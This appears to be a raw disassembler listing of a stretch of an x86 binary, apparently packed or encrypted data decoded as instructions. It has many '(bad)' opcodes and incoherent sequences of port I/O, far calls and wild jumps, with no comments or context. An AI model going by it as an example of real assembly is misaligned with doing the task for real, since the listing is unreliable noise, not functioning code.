  41df64:	cmp    al,0x8b
  41df66:	push   ss
  41df67:	pminub mm7,mm2
  41df6a:	mov    esi,0x95050b5f
  41df6f:	xchg   esi,eax
  41df70:	xchg   edx,eax
  41df71:	jbe    0x41df93
  41df73:	xchg   edi,eax
  41df74:	imul   esp,DWORD PTR [esp+ebp*8-0x2c],0xffffff8e
  41df79:	or     ebx,DWORD PTR [edi]
  41df7b:	and    eax,0x4b9b1003
  41df80:	jne    0x41df8b
  41df82:	push   0x7f
  41df84:	sub    dl,BYTE PTR [esi-0x2949df57]
  41df8a:	ins    BYTE PTR es:[edi],dx
  41df8b:	mov    edx,0x8038a029
  41df90:	adc    BYTE PTR [ecx+0x77],bh
  41df93:	leave  
  41df94:	jbe    0x41df49
  41df96:	out    dx,eax
  41df97:	push   es
  41df98:	xchg   esi,eax
  41df99:	mov    ds:0x7c513101,al
  41df9e:	or     al,0x88
  41dfa0:	stc    
  41dfa1:	and    eax,0x4ee9488
  41dfa6:	pop    eax
  41dfa7:	cmp    al,0x3f
  41dfa9:	je     0x41df5c
  41dfab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfac:	in     al,dx
  41dfad:	aaa    
  41dfae:	pop    edx
  41dfaf:	sub    DWORD PTR [edx],0x7ebeecbb
  41dfb5:	sbb    al,0xce
  41dfb7:	sub    DWORD PTR [edi+0x1a],ecx
  41dfba:	retf   
  41dfbb:	and    ecx,edx
  41dfbd:	shl    edx,0xac
  41dfc0:	mov    al,0xf4
  41dfc2:	daa    
  41dfc3:	adc    eax,0xf9673c1f
  41dfc8:	popf   
  41dfc9:	push   ecx
  41dfca:	(bad)  
  41dfcb:	dec    ebp
  41dfcc:	sbb    eax,0x5deb5257
  41dfd1:	loopne 0x41e031
  41dfd3:	xor    BYTE PTR [edx+ebx*4+0x3a422f50],0x6c
  41dfdb:	std    
  41dfdc:	or     eax,0x736173d6
  41dfe1:	dec    esi
  41dfe2:	xor    BYTE PTR [eax+0xc],dl
  41dfe5:	xor    al,0xca
  41dfe7:	sub    al,0x1e
  41dfe9:	push   ecx
  41dfea:	imul   edi,ebx,0x98f03d17
  41dff0:	int3   
  41dff1:	les    eax,FWORD PTR [eax]
  41dff3:	out    0x2b,eax
  41dff5:	sub    eax,0x9e9df041
  41dffa:	pop    edi
  41dffb:	leave  
  41dffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dffd:	call   DWORD PTR [edx+0x34]
  41e000:	xlat   BYTE PTR ds:[ebx]
  41e001:	xor    ah,dl
  41e003:	(bad)  
  41e004:	jp     0x41e009
  41e006:	mov    WORD PTR [esi+ebp*1+0x26],?
  41e00a:	stos   BYTE PTR es:[edi],al
  41e00b:	jnp    0x41dfef
  41e00d:	xor    BYTE PTR [edi+0x2ebe5689],0x64
  41e014:	cmp    al,0xbe
  41e016:	mov    edx,0x93cf203d
  41e01b:	das    
  41e01c:	dec    ebx
  41e01d:	or     esp,DWORD PTR [ebx+0x47]
  41e020:	sub    edi,edi
  41e022:	push   esi
  41e023:	adc    al,0x4d
  41e025:	adc    dh,BYTE PTR [ecx]
  41e027:	pop    ss
  41e028:	inc    edx
  41e029:	shr    DWORD PTR [eax+eiz*8-0x5b8cfabf],0x7
  41e031:	loopne 0x41e0a9
  41e033:	fstp   TBYTE PTR [ecx-0x49ee5be]
  41e039:	leave  
  41e03a:	jne    0x41e03e
  41e03c:	lahf   
  41e03d:	rol    BYTE PTR [esi+0x51],1
  41e040:	add    bh,BYTE PTR [edx+0x1c]
  41e043:	test   DWORD PTR [edx],ebp
  41e045:	(bad)  
  41e047:	pop    ecx
  41e048:	cmp    edi,DWORD PTR [eax+0x6ec35162]
  41e04e:	xchg   edi,eax
  41e04f:	jg     0x41e071
  41e051:	es jl  0x41e055
  41e054:	hlt    
  41e055:	xor    DWORD PTR [ecx],esp
  41e057:	sbb    BYTE PTR [esi],bh
  41e059:	rol    DWORD PTR [eax-0x5c],0x99
  41e05d:	inc    ebx
  41e05e:	inc    al
  41e060:	xor    BYTE PTR [eax],bh
  41e062:	(bad)  
  41e063:	(bad)  
  41e064:	pop    ebx
  41e065:	push   edx
  41e066:	jns    0x41e06e
  41e068:	ins    DWORD PTR es:[edi],dx
  41e069:	retf   
  41e06a:	adc    dh,BYTE PTR [esp+eax*8]
  41e06d:	cmc    
  41e06e:	jle    0x41e0b2
  41e070:	sub    DWORD PTR [eax+eax*4],ebx
  41e073:	sbb    eax,DWORD PTR [esi+eax*4+0x34]
  41e077:	pop    ebp
  41e079:	sub    BYTE PTR [esi-0x57],ch
  41e07c:	mov    DWORD PTR [edi-0x221d0ecf],esi
  41e082:	xor    bh,BYTE PTR [ebx+0x55fe1d91]
  41e088:	adc    DWORD PTR [esp+ebp*1],edi
  41e08b:	sbb    eax,0x272d2ee2
  41e090:	cmp    DWORD PTR [esi-0x327b8287],ebx
  41e096:	and    bl,dl
  41e098:	das    
  41e099:	add    DWORD PTR [ecx],edi
  41e09b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e09c:	jp     0x41e02e
  41e09e:	nop
  41e09f:	add    al,0x76
  41e0a1:	lods   eax,DWORD PTR ds:[esi]
  41e0a2:	inc    BYTE PTR [esi-0x1d]
  41e0a5:	aam    0x61
  41e0a7:	sar    BYTE PTR [ecx],1
  41e0a9:	jbe    0x41e0b5
  41e0ab:	ins    DWORD PTR es:[edi],dx
  41e0ac:	ret    0x2d1f
  41e0af:	push   ebx
  41e0b0:	pop    esi
  41e0b1:	mov    esi,0xd44b7f91
  41e0b6:	pop    esp
  41e0b7:	push   ebp
  41e0b8:	jmp    0x81bed709
  41e0bd:	push   edi
  41e0be:	dec    ecx
  41e0bf:	pop    esi
  41e0c0:	sbb    eax,0x74d0b05f
  41e0c5:	js     0x41e0e8
  41e0c7:	adc    BYTE PTR [edx],ch
  41e0c9:	and    al,0xd0
  41e0cb:	iret   
  41e0cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0cd:	fnstsw WORD PTR ds:[edi]
  41e0d0:	cmp    ecx,DWORD PTR [ebx+0x23cb8c78]
  41e0d6:	shl    DWORD PTR [edi-0x60],0x28
  41e0da:	dec    edi
  41e0db:	push   edx
  41e0dc:	jo     0x41e0a9
  41e0de:	cmc    
  41e0df:	mov    ds:0x2026da96,eax
  41e0e4:	in     al,dx
  41e0e5:	push   ecx
  41e0e6:	rol    dl,0x4b
  41e0e9:	cli    
  41e0ea:	xor    BYTE PTR [eax+0x2097f182],ah
  41e0f0:	sub    al,0xdd
  41e0f2:	mov    ecx,DWORD PTR [esi-0x32]
  41e0f5:	push   0x888fd418
  41e0fa:	leave  
  41e0fb:	outs   dx,DWORD PTR ds:[esi]
  41e0fc:	add    BYTE PTR [ebx+0x66],cl
  41e0ff:	test   al,0x62
  41e101:	aam    0xab
  41e103:	mov    edx,eax
  41e105:	sbb    al,0x24
  41e107:	pop    ebx
  41e108:	out    0xff,eax
  41e10a:	out    dx,eax
  41e10b:	mov    ebx,0x3931e6ed
  41e110:	imul   DWORD PTR [edx]
  41e112:	lods   eax,DWORD PTR ds:[esi]
  41e113:	loopne 0x41e09d
  41e115:	bound  esi,QWORD PTR [eax+edx*1-0xb]
  41e119:	mov    al,0xce
  41e11b:	lods   eax,DWORD PTR ds:[esi]
  41e11c:	daa    
  41e11d:	inc    ebp
  41e11e:	add    al,0x34
  41e120:	ins    DWORD PTR es:[edi],dx
  41e121:	ins    DWORD PTR es:[edi],dx
  41e122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e123:	or     al,0x74
  41e125:	ins    DWORD PTR es:[edi],dx
  41e126:	mov    cl,0x42
  41e128:	out    dx,eax
  41e129:	xchg   esi,eax
  41e12a:	xchg   esp,eax
  41e12b:	mov    ah,0xc
  41e12d:	mov    al,ds:0xa3fa395d
  41e132:	jp     0x41e151
  41e134:	add    DWORD PTR [eax+0x43f93f99],ecx
  41e13a:	sar    BYTE PTR [edi+0x4f23c26d],1
  41e140:	scas   al,BYTE PTR es:[edi]
  41e141:	cwde   
  41e142:	jp     0x41e100
  41e144:	sbb    ebx,DWORD PTR [edi-0x47]
  41e147:	jge    0x41e143
  41e149:	xor    ah,dh
  41e14b:	out    0xa,eax
  41e14d:	out    dx,eax
  41e14e:	push   es
  41e14f:	loopne 0x41e110
  41e151:	mov    dh,0xb
  41e153:	push   esi
  41e154:	fstp   DWORD PTR [eax+0x13]
  41e157:	pusha  
  41e158:	sbb    BYTE PTR [esp+ebx*8],ch
  41e15b:	stos   DWORD PTR es:[edi],eax
  41e15c:	test   ecx,edx
  41e15e:	cmp    DWORD PTR [ecx-0x16985a1c],ebp
  41e164:	(bad)  
  41e165:	lea    bx,[ebp+0x546618a4]
  41e16c:	repnz and DWORD PTR [edx-0x32420be4],eax
  41e173:	push   es
  41e174:	test   eax,0x8c181a4c
  41e179:	push   0x2d
  41e17b:	(bad)
  41e180:	dec    esi
  41e181:	ror    DWORD PTR [ecx-0x10aac9c3],1
  41e187:	retf   0x5e02
  41e18a:	mov    eax,ds:0x609732b6
  41e18f:	aas    
  41e190:	mov    esp,0xfb2ae684
  41e195:	push   es
  41e196:	push   0xffffff89
  41e198:	dec    esp
  41e199:	sbb    ebp,DWORD PTR [edx]
  41e19b:	add    BYTE PTR [ebx+0x7c2e8a05],bl
  41e1a1:	mov    bl,0xd4
  41e1a3:	fs scas eax,DWORD PTR es:[edi]
  41e1a5:	xor    edi,eax
  41e1a7:	xchg   esp,eax
  41e1a8:	cs imul edi,edx,0xc551a68f
  41e1af:	add    BYTE PTR [edi+0x72e73f06],al
  41e1b5:	popa   
  41e1b6:	fwait
  41e1b7:	adc    dl,BYTE PTR [ecx]
  41e1b9:	fmul   QWORD PTR [eax]
  41e1bb:	fist   DWORD PTR [ebx+ebx*4-0x28]
  41e1bf:	es mov eax,0xdee5109f
  41e1c5:	sbb    al,0xf2
  41e1c7:	and    ch,BYTE PTR fs:[esi+eax*2+0x52]
  41e1cc:	cli    
  41e1cd:	lods   al,BYTE PTR ds:[esi]
  41e1ce:	call   0xcd22:0x79f0bc38
  41e1d5:	cs mov eax,0xb94b4995
  41e1db:	icebp  
  41e1dc:	addr16 (bad) 
  41e1de:	imul   ecx
  41e1e0:	jecxz  0x41e17e
  41e1e2:	mov    dh,0xac
  41e1e4:	mov    cl,0x29
  41e1e6:	fisttp QWORD PTR [esi]
  41e1e8:	sar    DWORD PTR [edi],1
  41e1ea:	fs iret 
  41e1ec:	outs   dx,BYTE PTR ds:[esi]
  41e1ed:	jmp    0xa60c2ce5
  41e1f2:	sub    eax,0xf095787d
  41e1f7:	xchg   BYTE PTR [ecx],dl
  41e1f9:	mov    BYTE PTR ds:0x275e476e,dl
  41e1ff:	cld    
  41e200:	retf   
  41e201:	sti    
  41e202:	mov    al,BYTE PTR [edi+ebx*1-0x4d9a6a33]
  41e209:	xlat   BYTE PTR ds:[ebx]
  41e20a:	in     eax,dx
  41e20b:	xchg   edi,eax
  41e20c:	jno    0x41e26a
  41e20e:	and    BYTE PTR ds:0xe01bde32,bh
  41e214:	lods   eax,DWORD PTR ds:[esi]
  41e215:	add    cl,0xf9
  41e218:	and    dh,ah
  41e21a:	jae    0x41e220
  41e21c:	nop
  41e21d:	stc    
  41e21e:	(bad)  
  41e21f:	arpl   WORD PTR [edx],dx
  41e221:	push   edx
  41e222:	cmp    al,BYTE PTR [edi-0x2d65740f]
  41e228:	mov    edx,0x475bff1a
  41e22d:	cdq    
  41e22e:	xor    BYTE PTR [eax+0x13],dh
  41e231:	ficom  DWORD PTR [edx+0x5e34e852]
  41e237:	mov    eax,ds:0x36a7be13
  41e23c:	jne    0x41e1eb
  41e23e:	cwde   
  41e23f:	or     DWORD PTR es:[eax+0x6d],0x2b
  41e244:	fild   WORD PTR [edx]
  41e246:	xchg   esp,eax
  41e247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e248:	lds    edi,FWORD PTR [ebp+0x38]
  41e24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e24c:	sbb    bl,BYTE PTR [ecx-0xeca2ec0]
  41e252:	scas   al,BYTE PTR es:[edi]
  41e253:	lock inc edi
  41e255:	xchg   edi,eax
  41e256:	add    bh,BYTE PTR [eax+0x416606f]
  41e25c:	je     0x41e280
  41e25e:	leave  
  41e25f:	jns    0x41e227
  41e261:	pop    esi
  41e262:	cmp    DWORD PTR [esi+0x81c3],edx
	...
  41e438:	add    BYTE PTR [eax],al
  41e43a:	scas   eax,DWORD PTR es:[edi]
  41e43b:	ror    esp,1
  41e43d:	push   esp
  41e43e:	(bad)  
  41e43f:	pop    ebp
  41e440:	mov    edi,0x5e13fbfb
  41e445:	cmp    DWORD PTR [ecx],ecx
  41e447:	push   ss
  41e448:	ror    DWORD PTR [ecx+ecx*2-0x1e],cl
  41e44c:	add    DWORD PTR [eax],eax
  41e44e:	and    al,BYTE PTR [edi]
  41e450:	add    BYTE PTR [eax],al
  41e452:	loop   0x41e462
  41e454:	adc    BYTE PTR [ebx+0x19],bl
  41e457:	iret   
  41e458:	enter  0xa501,0xdb
  41e45c:	pop    esp
  41e45d:	ret    0x7fc2
  41e460:	mov    bl,BYTE PTR [ebx-0x30234e14]
  41e466:	stos   BYTE PTR es:[edi],al
  41e467:	adc    al,0x14
  41e469:	jmp    0x974ae155
  41e46e:	mov    esi,0x357c9894
  41e473:	mov    eax,0x739ab866
  41e478:	pop    ss
  41e479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e47a:	adc    bh,bl
  41e47c:	dec    eax
  41e47d:	adc    al,0x5e
  41e47f:	fcom   DWORD PTR [edi+esi*2+0xc7030e9]
  41e486:	push   edi
  41e487:	and    eax,0xc84082d7
  41e48c:	xor    eax,0x65850b5e
  41e491:	sbb    DWORD PTR ss:[ecx],0x28
  41e495:	imul   eax,DWORD PTR [esi+0x14942b46],0xe123a029
  41e49f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41e4a1:	dec    edi
  41e4a2:	mov    eax,0x8343b289
  41e4a7:	loopne 0x41e490
  41e4a9:	xchg   BYTE PTR [edi+0x43ccc84a],bh
  41e4af:	call   FWORD PTR [ebp+0x2f8edbbc]
  41e4b5:	fistp  WORD PTR [ebp+0x5d263e0c]
  41e4bb:	test   DWORD PTR [esi+0x7316c40d],esp
  41e4c1:	xlat   BYTE PTR ds:[ebx]
  41e4c2:	ficom  WORD PTR [eax+0x1c]
  41e4c5:	ret    
  41e4c6:	(bad)  
  41e4c7:	sub    al,0xed
  41e4c9:	fs xor al,0xac
  41e4cc:	int3   
  41e4cd:	imul   ecx,DWORD PTR ds:[ebx],0x69a219e3
  41e4d4:	fdiv   DWORD PTR [eax]
  41e4d6:	xchg   ecx,eax
  41e4d7:	jnp    0x41e4ef
  41e4d9:	dec    esp
  41e4da:	push   esi
  41e4db:	aad    0xfc
  41e4dd:	xchg   ecx,eax
  41e4de:	shl    DWORD PTR [esi-0x3c3f8923],0x32
  41e4e5:	pop    eax
  41e4e6:	xor    cl,BYTE PTR [edx+0x4da6efd3]
  41e4ec:	(bad)  
  41e4ed:	and    eax,0x289c374e
  41e4f2:	aam    0x7e
  41e4f4:	add    dl,BYTE PTR ds:0xe6a106d4
  41e4fa:	push   0xb72cce05
  41e4ff:	jle    0x41e567
  41e501:	out    0x88,al
  41e503:	dec    eax
  41e504:	xchg   ecx,eax
  41e505:	stc    
  41e506:	mov    ds:0x94abeb39,eax
  41e50b:	into   
  41e50c:	inc    ebp
  41e50d:	pop    esp
  41e50e:	mov    al,ds:0xb264a49b
  41e513:	or     al,BYTE PTR [edi-0x3b]
  41e516:	mov    bh,0x5f
  41e518:	inc    ecx
  41e519:	shl    BYTE PTR [ebx],1
  41e51b:	adc    al,0xc6
  41e51d:	jbe    0x41e531
  41e51f:	loop   0x41e519
  41e521:	out    0xa5,eax
  41e523:	mov    esp,0x7918e112
  41e528:	mov    ch,0xfa
  41e52a:	xor    ch,ch
  41e52c:	iret   
  41e52d:	push   ds
  41e52e:	loop   0x41e54f
  41e530:	cmp    al,0x47
  41e532:	mov    edx,0x37cc19ee
  41e537:	sbb    DWORD PTR [ebx],0xffffffa5
  41e53a:	addr16 fwait
  41e53c:	mov    ecx,0x5c2eaea7
  41e541:	inc    ecx
  41e542:	aas    
  41e543:	loope  0x41e51c
  41e545:	or     eax,0xcf661bcd
  41e54a:	add    bh,BYTE PTR [edx+edx*4]
  41e54d:	sbb    BYTE PTR [ebp-0x352bf308],dh
  41e553:	fiadd  WORD PTR [edx]
  41e555:	iret   
  41e556:	inc    esp
  41e557:	jl     0x41e57f
  41e559:	jmp    0x4b72c1a5
  41e55e:	mov    bl,0xe
  41e560:	push   esi
  41e561:	sub    al,BYTE PTR [ecx+0x67]
  41e564:	push   ss
  41e565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e566:	or     eax,0xf0e838b3
  41e56b:	xor    al,ah
  41e56d:	xchg   esi,eax
  41e56e:	xchg   esi,eax
  41e56f:	adc    al,0xfb
  41e571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e572:	add    DWORD PTR [ebp+0x75a346d4],ebx
  41e578:	mov    dl,0xb7
  41e57a:	leave  
  41e57b:	out    0xe6,eax
  41e57d:	adc    al,0x82
  41e57f:	(bad)  
  41e580:	push   esi
  41e581:	or     al,0xc1
  41e583:	test   DWORD PTR [eax+0x357216bd],esp
  41e589:	dec    esp
  41e58a:	mov    cs,WORD PTR [esi-0x4c322403]
  41e590:	out    0xc3,al
  41e592:	hlt    
  41e593:	dec    edi
  41e594:	sbb    DWORD PTR [ecx-0x36e7cd7b],edx
  41e59a:	(bad)  
  41e59c:	pusha  
  41e59d:	and    eax,0xe37f0204
  41e5a2:	sub    BYTE PTR ds:0x14706fa9,dh
  41e5a8:	mov    BYTE PTR [eax],bl
  41e5aa:	(bad)  
  41e5ab:	push   esi
  41e5ac:	ficom  WORD PTR [ebx-0x1905bba6]
  41e5b2:	or     WORD PTR ss:[ebx],ax
  41e5b6:	aaa    
  41e5b7:	inc    esp
  41e5b8:	sub    BYTE PTR [edx+0x4f1fa19],dl
  41e5be:	icebp  
  41e5bf:	(bad)  
  41e5c0:	mov    al,0x8c
  41e5c2:	fwait
  41e5c3:	aaa    
  41e5c4:	pop    ecx
  41e5c5:	adc    edi,DWORD PTR [eax+0x7f]
  41e5c8:	jl     0x41e5fd
  41e5ca:	(bad)  
  41e5cb:	idiv   BYTE PTR ds:[ebx+0xc]
  41e5cf:	data16 ja 0x41e571
  41e5d2:	dec    edx
  41e5d3:	call   0x1f5c:0xf8cdbddc
  41e5da:	jp     0x41e626
  41e5dc:	stos   DWORD PTR es:[edi],eax
  41e5dd:	xchg   edi,eax
  41e5de:	jbe    0x41e568
  41e5e0:	xor    BYTE PTR [esi+0x1b],0xef
  41e5e4:	ror    BYTE PTR ds:0x405236f1,1
  41e5ea:	scas   al,BYTE PTR es:[edi]
  41e5eb:	gs mov dh,0xf8
  41e5ee:	adc    esp,DWORD PTR [ecx]
  41e5f0:	push   eax
  41e5f1:	mov    bl,0xc4
  41e5f3:	cmp    ebx,DWORD PTR [edi+0x3d3caddd]
  41e5f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5fa:	fcmovnu st,st(6)
  41e5fc:	cwde   
  41e5fd:	inc    eax
  41e5fe:	call   0xb50b:0x1b5256a2
  41e605:	mov    WORD PTR [esi+0x312341a0],ds
  41e60b:	push   ecx
  41e60c:	pop    es
  41e60d:	aas    
  41e60e:	cmp    BYTE PTR [esi],dl
  41e610:	hlt    
  41e611:	xor    esi,DWORD PTR [ebx-0x56]
  41e614:	sub    BYTE PTR [ebp+0x2a535e65],ah
  41e61a:	bnd jp 0x41e5c0
  41e61d:	stc    
  41e61e:	xchg   edx,eax
  41e61f:	mov    al,0xa1
  41e621:	mov    ds:0x2bc6bff8,al
  41e626:	in     eax,dx
  41e627:	jb     0x41e5a9
  41e629:	imul   eax,DWORD PTR [edi+0x687c7bca],0xffffffd1
  41e630:	call   0x66d66a29
  41e635:	adc    bl,dh
  41e637:	mov    cl,0x99
  41e639:	jp     0x41e663
  41e63b:	idiv   eax
  41e63d:	dec    eax
  41e63e:	add    DWORD PTR [edx],esp
  41e640:	sbb    al,0xdb
  41e642:	xor    eax,0x94fce827
  41e647:	aam    0x19
  41e649:	aad    0xa1
  41e64b:	mov    es,WORD PTR [esi+0x51]
  41e64e:	out    dx,eax
  41e64f:	stos   BYTE PTR es:[edi],al
  41e650:	(bad)  [ecx-0x46301122]
  41e656:	sub    bl,bl
  41e658:	je     0x41e635
  41e65a:	sub    eax,ecx
  41e65c:	int    0xa4
  41e65e:	add    eax,0x7d9b7ba9
  41e663:	dec    ebx
  41e664:	xchg   BYTE PTR [ecx-0x10],ch
  41e667:	pop    es
  41e668:	fwait
  41e669:	sti    
  41e66a:	in     eax,dx
  41e66b:	es adc al,0xfc
  41e66e:	mov    eax,ds:0x8234db9d
  41e673:	pop    edi
  41e674:	push   0xffffffa4
  41e676:	or     DWORD PTR [ecx+0x27],ebx
  41e679:	xchg   ecx,eax
  41e67a:	jo     0x41e68c
  41e67c:	dec    edi
  41e67d:	jmp    0xd384:0x4a8f4eb
  41e684:	add    eax,0xad40cd85
  41e689:	and    al,0x1a
  41e68b:	sub    eax,0x94286b0a
  41e690:	pop    esi
  41e691:	mov    WORD PTR [ebp+edi*8-0x3b5d85c4],ds
  41e698:	outs   dx,BYTE PTR ds:[esi]
  41e699:	or     cl,0x23
  41e69c:	mov    dl,0x93
  41e69e:	add    BYTE PTR [esi],dh
  41e6a0:	addr16 daa 
  41e6a2:	jp     0x41e646
  41e6a4:	rcl    BYTE PTR [esp+eiz*4+0x15],1
  41e6a8:	(bad)  
  41e6a9:	jle    0x41e635
  41e6ab:	push   cs
  41e6ac:	inc    edx
  41e6ad:	adc    BYTE PTR [edx-0x45],bh
  41e6b0:	inc    esi
  41e6b1:	stos   DWORD PTR es:[edi],eax
  41e6b2:	hlt    
  41e6b3:	std    
  41e6b4:	dec    edi
  41e6b5:	cmp    BYTE PTR [edx+0x23e4790e],dh
  41e6bb:	mov    ch,0x95
  41e6bd:	mov    esi,0x98ecf80a
  41e6c2:	scas   al,BYTE PTR es:[edi]
  41e6c3:	inc    edx
  41e6c4:	dec    eax
  41e6c5:	jbe    0x41e67a
  41e6c7:	test   al,0x43
  41e6c9:	(bad)  
  41e6ca:	nop
  41e6cb:	push   ebx
  41e6cc:	arpl   WORD PTR [edx+0x78],bx
  41e6cf:	dec    esp
  41e6d0:	sub    bh,ah
  41e6d2:	icebp  
  41e6d3:	mov    ebp,DWORD PTR [edx-0x45da7fb6]
  41e6d9:	fs jns 0x41e6cf
  41e6dc:	ret    
  41e6dd:	je     0x41e69d
  41e6df:	dec    eax
  41e6e0:	push   DWORD PTR [esi-0x7e174135]
  41e6e6:	ins    BYTE PTR es:[edi],dx
  41e6e7:	iret   
  41e6e8:	xor    ch,cl
  41e6ea:	jp     0x41e6f4
  41e6ec:	add    cl,BYTE PTR ds:[edi+0x24]
  41e6f0:	xor    ebp,DWORD PTR [eax+0x28]
  41e6f3:	mov    esp,0x791590e3
  41e6f8:	inc    edx
  41e6f9:	cmp    ah,ch
  41e6fb:	lods   eax,DWORD PTR ds:[esi]
  41e6fc:	mov    cl,0xe2
  41e6fe:	fbld   TBYTE PTR [esi+0x613713c6]
  41e704:	cdq    
  41e705:	outs   dx,BYTE PTR ds:[esi]
  41e706:	and    DWORD PTR [edi],eax
  41e708:	xor    ch,BYTE PTR [ecx]
  41e70a:	hlt    
  41e70b:	cdq    
  41e70c:	jmp    0x41e72f
  41e70e:	push   eax
  41e70f:	add    ebx,DWORD PTR [ebx+0x1ce01578]
  41e715:	push   edx
  41e716:	shr    BYTE PTR [esi-0x37],cl
  41e719:	icebp  
  41e71a:	gs pop ebp
  41e71c:	test   eax,0xaf9c083c
  41e721:	pop    ebp
  41e722:	adc    cl,BYTE PTR [ebp+0x4e]
  41e725:	aas    
  41e726:	xor    edi,edi
  41e728:	pop    ebp
  41e729:	and    ah,BYTE PTR [ecx-0x7a]
  41e72c:	inc    esp
  41e72d:	sub    eax,0x61f2e328
  41e732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e733:	pop    esi
  41e734:	fucom  st(7)
  41e736:	inc    ebp
  41e737:	adc    al,0x91
  41e739:	lods   al,BYTE PTR ds:[esi]
  41e73a:	retf   0x4787
  41e73d:	add    al,BYTE PTR [ecx+0x71]
  41e740:	add    eax,0xfb1611ff
  41e745:	add    ecx,DWORD PTR [edi-0x72]
  41e748:	cmc    
  41e749:	cld    
  41e74a:	outs   dx,BYTE PTR ds:[esi]
  41e74b:	inc    ecx
  41e74c:	cwde   
  41e74d:	retf   0x4614
  41e750:	fisubr DWORD PTR [ebx-0x70]
  41e753:	add    edi,ebx
  41e755:	rcr    bh,1
  41e757:	rcr    edi,1
  41e759:	jbe    0x41e72c
  41e75b:	lahf   
  41e75c:	shr    DWORD PTR [ecx-0x34],0xdd
  41e760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e761:	repnz pop edx
  41e763:	(bad)  
  41e764:	xchg   ecx,eax
  41e765:	or     DWORD PTR [eax-0x45],0x6c2bbf7b
  41e76c:	leave  
  41e76d:	int3   
  41e76e:	cwde   
  41e76f:	dec    edx
  41e770:	add    eax,0x6145c422
  41e775:	icebp  
  41e776:	outs   dx,DWORD PTR ds:[esi]
  41e777:	jbe    0x41e770
  41e779:	loop   0x41e7e3
  41e77b:	cmp    esp,eax
  41e77d:	loopne 0x41e762
  41e77f:	push   ebp
  41e780:	xlat   BYTE PTR ds:[ebx]
  41e781:	and    BYTE PTR ss:[edx],dl
  41e784:	push   cs
  41e785:	cmp    DWORD PTR [esi],ebp
  41e787:	adc    DWORD PTR [edx+ebp*2+0x558303d9],ebx
  41e78e:	cmp    bl,BYTE PTR es:[edx+0x2bbd04d6]
  41e795:	push   esp
  41e796:	push   ss
  41e797:	xchg   esi,eax
  41e798:	ror    DWORD PTR [ecx*2+0x5e9e05c8],1
  41e79f:	fst    DWORD PTR [edi+ebx*4-0x4bd1f382]
  41e7a6:	out    0x1b,eax
  41e7a8:	inc    eax
  41e7a9:	cmp    ecx,edx
  41e7ab:	xor    esi,DWORD PTR [edx]
  41e7ad:	sbb    al,0xc9
  41e7af:	nop
  41e7b0:	mov    ecx,0x71150e6c
  41e7b5:	and    edx,DWORD PTR [esi+0x50aeb235]
  41e7bb:	cmp    eax,0xd5361bd
  41e7c0:	aas    
  41e7c1:	xchg   edi,eax
  41e7c2:	call   0x43569d91
  41e7c7:	mov    ds:0x2d1012ae,eax
  41e7cc:	sar    BYTE PTR [esi-0x78556a11],1
  41e7d2:	inc    ebx
  41e7d3:	retf   
  41e7d4:	pop    esi
  41e7d5:	mov    esi,0x7cd4b15d
  41e7da:	adc    eax,0x339a1cf8
  41e7df:	push   ecx
  41e7e0:	mov    ds:0x427f2606,al
  41e7e5:	pop    ebx
  41e7e6:	int    0x10
  41e7e8:	push   ds
  41e7e9:	add    eax,0xf18c79b1
  41e7ee:	jp     0x41e7a2
  41e7f0:	mov    cl,0x41
  41e7f2:	mov    ebx,0x37f6cd9c
  41e7f7:	push   edx
  41e7f8:	sbb    al,0x72
  41e7fa:	fadd   QWORD PTR [ebp+0x5202c2ca]
  41e800:	and    ch,BYTE PTR [eax]
  41e802:	sahf   
  41e803:	ret    
  41e804:	mov    WORD PTR [edx+0x7cc1d8d],cs
  41e80a:	mov    al,ds:0xbc305cb0
  41e80f:	add    bh,BYTE PTR [edx]
  41e811:	xchg   esp,eax
  41e812:	xchg   edx,eax
  41e813:	push   ss
  41e814:	dec    esp
  41e815:	add    eax,0x8164c5cc
  41e81a:	jo     0x41e86b
  41e81c:	hlt    
  41e81d:	dec    edx
  41e81e:	jo     0x41e7a9
  41e820:	in     al,0x87
  41e822:	daa    
  41e823:	cmc    
  41e824:	movhps xmm6,QWORD PTR [eax-0x4eb82ec6]
  41e82b:	cmp    eax,0xb68fac98
  41e830:	lock xchg BYTE PTR [ebx],bh
  41e833:	and    dh,ah
  41e835:	push   0x58
  41e837:	stc    
  41e838:	or     cl,al
  41e83a:	push   esi
  41e83b:	inc    esi
  41e83c:	fsub   QWORD PTR [ebx-0x75ea7d6a]
  41e842:	xor    dl,dh
  41e844:	cmp    DWORD PTR [eax+0x50956253],ebx
  41e84a:	sahf   
  41e84b:	shr    DWORD PTR [edx+0x23ab4e26],1
  41e851:	cmp    dl,BYTE PTR [ecx+edx*1+0x5b56358c]
  41e858:	pop    ebx
  41e859:	std    
  41e85a:	fcmovu st,st(0)
  41e85c:	fdivr  DWORD PTR [edx]
  41e85e:	dec    ebx
  41e85f:	mov    ds:0x13640270,eax
  41e864:	stos   DWORD PTR es:[edi],eax
  41e865:	in     eax,dx
  41e866:	(bad)  [ebp+0x77b95297]
  41e86c:	jecxz  0x41e8b7
  41e86e:	push   edi
  41e86f:	mov    bl,0xc2
  41e871:	fistp  WORD PTR [edx+ecx*8-0x69ea2ffa]
  41e878:	push   0xffffffdd
  41e87a:	pop    ss
  41e87b:	sub    DWORD PTR [ebp-0x5c],edi
  41e87e:	(bad)  
  41e87f:	pop    esi
  41e880:	mov    eax,ds:0x8a2e1dc7
  41e885:	aam    0x5c
  41e887:	sbb    al,0x38
  41e889:	shr    DWORD PTR [edi-0x7c],cl
  41e88c:	(bad)  
  41e88e:	cwde   
  41e88f:	mul    ecx
  41e891:	or     bl,ah
  41e893:	xchg   dh,al
  41e895:	icebp  
  41e896:	xor    al,0x51
  41e898:	jg     0x41e8e3
